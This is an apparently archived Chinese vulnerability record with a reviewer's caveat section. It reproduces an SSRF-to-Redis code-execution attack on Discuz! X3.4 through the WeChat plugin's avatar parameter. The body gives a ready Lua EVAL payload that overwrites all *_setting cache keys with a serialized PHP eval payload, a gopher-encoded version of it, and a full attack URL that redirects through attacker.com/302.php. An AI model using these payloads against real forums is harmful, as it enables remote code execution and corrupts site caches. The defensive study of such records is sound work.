---
source: "hatch 补库批 20260928"
product: "Discuz X3.4 with Redis/WeChat"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz! X3.4 ssrf 攻击redis"
prerequisites: "来源所述条件，未列明部分仍待核：Unauthenticated Redis reachable internally; Lua EVAL/KEYS; WeChat avatar SSRF; HTTP-to-gopher redirects; settings eval sink"
side_effects: "未执行；本文需注意的操作影响：Example changes every *_setting key, potentially other sites' caches; serious side effect not disclosed"
source_status: "unknown"
id: "vw-a144a27f9a7cdb39ea23f2c1"
entity_id: "ve-a144a27f9a7cdb39ea23f2c1"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Unauthenticated Redis reachable internally; Lua EVAL/KEYS; WeChat avatar SSRF; HTTP-to-gopher redirects; settings eval sink

- **适用与权限边界（1）**：Overview authkey requirement unexplained and not used; Lua enumerates keys instead。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：Example changes every *_setting key, potentially other sites' caches; serious side effect not disclosed。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（3）**：302.php assumed from companion article but not defined here; version/PHP/gopher conditions omitted。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（4）**：Precise same source as89; Redis mechanism complementary, not duplicate。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz! X3.4 ssrf 攻击redis

一、漏洞简介
------------

需要得到authkey

二、漏洞影响
------------

Discuz x3.4

三、复现过程
------------

类似地，Dz 整合 Redis
配置成功后，默认情况下网站首页右下角会出现`Redis On`的标志：

![](./.resource/Discuz!X3.4ssrf攻击redis/media/rId24.jpg)

SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua
脚本，可以直接用 lua
脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis
没有配置密码认证，Discuz requirepass 那一项为空：

![](./.resource/Discuz!X3.4ssrf攻击redis/media/rId25.jpg)

Redis 交互命令行执行 lua 脚本：

    eval "local t=redis.call('keys','*_setting'); for i,v in ipairs(t) do redis.call('set', v, 'a:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";a:1:{s:7:\"plugins\";s:4:\"/.*/\";}s:7:\"replace\";a:1:{s:7:\"plugins\";s:9:\"phpinfo()\";}}}s:13:\"rewritestatus\";i:1;}') end; return 1;" 0

![](./.resource/Discuz!X3.4ssrf攻击redis/media/rId26.jpg)

同样地，对这个过程抓包，将数据包改成 gopher 的形式：

    gopher://localhost:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24264%0d%0alocal%20t%3Dredis.call('keys'%2C'*_setting')%3B%20for%20i%2Cv%20in%20ipairs(t)%20do%20redis.call('set'%2C%20v%2C%20'a%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D')%20end%3B%20return%201%3B%0d%0a%241%0d%0a0%0d%0a

SSRF 利用：

    http://target/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjYzNzkvXyozJTBkJTBhJTI0NCUwZCUwYWV2YWwlMGQlMGElMjQyNjQlMGQlMGFsb2NhbCUyMHQlM0RyZWRpcy5jYWxsKCdrZXlzJyUyQycqX3NldHRpbmcnKSUzQiUyMGZvciUyMGklMkN2JTIwaW4lMjBpcGFpcnModCklMjBkbyUyMHJlZGlzLmNhbGwoJ3NldCclMkMlMjB2JTJDJTIwJ2ElM0EyJTNBJTdCcyUzQTYlM0ElMjJvdXRwdXQlMjIlM0JhJTNBMSUzQSU3QnMlM0E0JTNBJTIycHJlZyUyMiUzQmElM0EyJTNBJTdCcyUzQTYlM0ElMjJzZWFyY2glMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E0JTNBJTIyJTJGLiolMkYlMjIlM0IlN0RzJTNBNyUzQSUyMnJlcGxhY2UlMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E5JTNBJTIycGhwaW5mbygpJTIyJTNCJTdEJTdEJTdEcyUzQTEzJTNBJTIycmV3cml0ZXN0YXR1cyUyMiUzQmklM0ExJTNCJTdEJyklMjBlbmQlM0IlMjByZXR1cm4lMjAxJTNCJTBkJTBhJTI0MSUwZCUwYTAlMGQlMGE%253D&wxopenid=xxxyyyzzz

代码即再次执行成功。

参考链接
--------

> https://zhuanlan.zhihu.com/p/51907363
